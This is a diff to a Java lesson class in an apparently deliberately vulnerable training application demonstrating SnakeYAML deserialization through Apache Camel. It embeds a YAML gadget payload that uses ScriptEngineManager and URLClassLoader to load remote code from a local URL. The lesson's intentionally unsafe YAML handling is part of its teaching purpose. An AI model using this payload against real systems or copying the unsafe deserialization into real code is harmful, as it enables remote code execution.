@@ -67,9 +67,9 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
           });
 
       ClassLoader loader = SnakeYAMLDataFormat.class.getClassLoader();
-      loader = loader.loadClass("org.yaml.camel-snakeyaml.Yaml").getClassLoader();
+      loader = loader.loadClass("org.yaml.snakeyaml.Yaml").getClassLoader();
       log.info("snakeyaml class loaded {}", loader);
-
+      camelctx.getTypeConverterRegistry().addTypeConverters(new Test1(new ObjectMapper()));
       camelctx.start();
 
       ProducerTemplate template = camelctx.createProducerTemplate();
@@ -81,6 +81,7 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
           .output(ex.getMessage())
           .build();
     } catch (Exception ex) {
+      ex.printStackTrace();
       return failed(this)
           .feedback("vulnerable-camel-snakeyaml-components.close")
           .output(ex.getMessage())
@@ -97,7 +98,7 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
 
     String payload =
         "some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL"
-            + " [\"http://localhost:9000/\"]]]]";
+            + " [\"http://localhost:8000/\"]]]]";
 
     try {
       CamelContext camelctx = new DefaultCamelContext();
@@ -112,8 +113,9 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
       ClassLoader loader = SnakeYAMLDataFormat.class.getClassLoader();
       loader = loader.loadClass("org.yaml.snakeyaml.Yaml").getClassLoader();
       // log.info("snakeyaml class loaded {}", loader);
-
+      camelctx.setStreamCaching(true);
       camelctx.start();
+     
 
       ProducerTemplate template = camelctx.createProducerTemplate();
       Test1 result = template.requestBody("direct:start", payload, Test1.class);
@@ -130,40 +132,3 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
   }
 }
 
-@Converter
-class Test1 implements TypeConverters {
-  public String some_var = "abc";
-
-  public String getSome_var() {
-    return some_var;
-  }
-
-  public void setSome_var(String some_var) {
-    this.some_var = some_var;
-  }
-
-  private final ObjectMapper mapper;
-
-  @Autowired
-  public Test1(ObjectMapper mapper) {
-    this.mapper = mapper;
-  }
-
-  @Converter
-  public byte[] myPackageToByteArray(Test1 source) {
-    try {
-      return mapper.writeValueAsBytes(source);
-    } catch (JsonProcessingException e) {
-      throw new RuntimeException(e);
-    }
-  }
-
-  @Converter
-  public Test1 byteArrayToMyPackage(byte[] source) {
-    try {
-      return mapper.readValue(source, Test1.class);
-    } catch (IOException e) {
-      throw new RuntimeException(e);
-    }
-  }
-}
